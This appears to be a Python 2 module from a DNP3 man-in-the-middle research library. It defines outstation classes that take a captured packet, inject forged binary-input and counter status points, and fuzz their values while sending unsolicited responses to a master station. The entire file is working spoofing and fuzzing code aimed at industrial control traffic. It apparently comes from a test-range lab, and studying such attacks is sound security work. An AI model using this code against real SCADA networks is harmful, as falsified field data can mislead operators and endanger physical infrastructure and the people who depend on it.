__author__ = 'Nicholas Rodofile'
from DNP3_Slave import *

SPOOFABLE_OBJECTS = 5
class DNP3_Slave_Object_Spoof_BinaryStatus(Slave):
    def configuration(self):
        pcap = rdpcap("/root/DNP3_MITM_Lib 2/DNP3_MITM_Lib/DNP3_Lib/pcaps/test_range2.pcap")
        r = pcap[10]
        self.node.spoofer.object_handler.clear_class_objects()
        self.node.spoofer.object_handler.add_class_objects(r.DataObject)
        dnp3_obj = IndexPoints8BitAndStartStopBinaryInput
        for d in self.node.spoofer.object_handler.data_objects:
            for obj in self.node.spoofer.object_handler.data_objects[d]:
                if obj[DNP3ResponseClassObjects].haslayer(dnp3_obj):
                    for i in range(0, SPOOFABLE_OBJECTS):
                        spoof = BinaryStatus(
                            STATE=UNSET,
                            Reserved=UNSET,
                            CHATTER_FILTER=UNSET,
                            LOCAL_FORCED=UNSET,
                            REMOTE_FORCED=UNSET,
                            COMM_LOST=UNSET,
                            RESTART=UNSET,
                            ONLINE=SET
                        )
                        obj[dnp3_obj].DataPointsBinaryInput.append(spoof)
                        obj[dnp3_obj].stop += 1


class DNP3_Slave_Object_Spoof_CounterStatus(Slave):
    def configuration(self):
        pcap = rdpcap("/root/DNP3_MITM_Lib 2/DNP3_MITM_Lib/DNP3_Lib/pcaps/test_range2.pcap")
        r = pcap[10]
        self.node.spoofer.object_handler.clear_class_objects()
        self.node.spoofer.object_handler.add_class_objects(r.DataObject)
        dnp3_obj = IndexPoints8BitAndStartStopCounter
        for d in self.node.spoofer.object_handler.data_objects:
            for obj in self.node.spoofer.object_handler.data_objects[d]:
                if obj[DNP3ResponseClassObjects].haslayer(dnp3_obj):
                    for i in range(0, SPOOFABLE_OBJECTS):
                        spoof = CounterStatus(
                            ONLINE=UNSET,
                            RESTART=UNSET,
                            COMM_LOST=UNSET,
                            REMOTE_FORCED=UNSET,
                            LOCAL_FORCED=UNSET,
                            CHATTER_FILTER=UNSET,
                            Reserved=UNSET,
                            STATE=UNSET,
                            Counter=0
                        )
                        obj[dnp3_obj].DataPointsCounter.append(spoof)
                        obj[dnp3_obj].stop += 1


class DNP3_Slave_Object_Spoof_BinaryStatus_fuzz(DNP3_Slave_Object_Spoof_BinaryStatus):
    def automation(self):
        print "Automation running..."
        self.configuration()
        if self.running:
            while self.running:
                int_ = randint(0, 255)
                self.node.spoofer.object_handler.update_binary_input_point_fuzz(2, randint(0, SPOOFABLE_OBJECTS), int_)
                if int_ < 150:
                    sleep(1)
                    unsolicited_response = self.node.spoofer.get_unsolicited_response(2, 2)
                    self.queue_out.put(unsolicited_response)


class DNP3_Slave_Object_Spoof_CounterStatus_fuzz(DNP3_Slave_Object_Spoof_CounterStatus):
    def automation(self):
        print "Automation running..."
        self.configuration()
        if self.running:
            while self.running:
                int_ = randint(0, 255)
                self.node.spoofer.object_handler.update_counter_fuzz(randint(0, SPOOFABLE_OBJECTS), int_)
                if int_ < 150:
                    sleep(1)
                    unsolicited_response = self.node.spoofer.get_unsolicited_response(2, 2)
                    self.queue_out.put(unsolicited_response)